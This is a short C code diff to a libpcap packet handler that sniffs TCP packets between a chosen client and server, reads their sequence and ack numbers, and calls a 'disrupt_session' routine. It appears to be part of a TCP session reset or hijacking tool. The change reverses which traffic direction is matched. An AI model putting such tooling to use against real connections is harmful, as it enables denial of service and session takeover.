@@ -150,16 +150,16 @@ void processPacket(u_char *arg, const struct pcap_pkthdr *pktHeader, const u_cha
         uint16_t sourcePort = ntohs(tcpHeader->source);
         uint16_t destPort = ntohs(tcpHeader->dest);
 
-        if ( !(strcmp(sniffArgs->clientIP, srcIP)) ) {
-            printf("[processPocket]: Matching client IP found: %s\n", srcIP);
-            if ( !(strcmp(sniffArgs->serverIP, dstIP)) ) {
-                printf("[processPocket]: Matching server IP found: %s\n", dstIP);
-                if ( sniffArgs->serverPort == destPort ){
+        if ( !(strcmp(sniffArgs->clientIP, dstIP)) ) {
+            printf("[processPocket]: Matching client IP found: %s\n", dstIP);
+            if ( !(strcmp(sniffArgs->serverIP, srcIP)) ) {
+                printf("[processPocket]: Matching server IP found: %s\n", srcIP);
+                if ( sniffArgs->serverPort == sourcePort ){
                     printf("[processPocket]: Matching server port found: %d\n", destPort);
                     printf("[processPocket]: sequence Number: %u\n", (uint32_t)seqNum);
                     printf("[processPocket]: ack Number: %u\n", (uint32_t)ackNum);                    
                     printf("[processPocket]: Disrupting.....\n");
-                    disrupt_session(srcIP, sourcePort, dstIP, destPort, seqNum, ackNum);
+                    disrupt_session(srcIP, sourcePort, dstIP, destPort, seqNum, ackNum, 0);
                 }
             }
         }
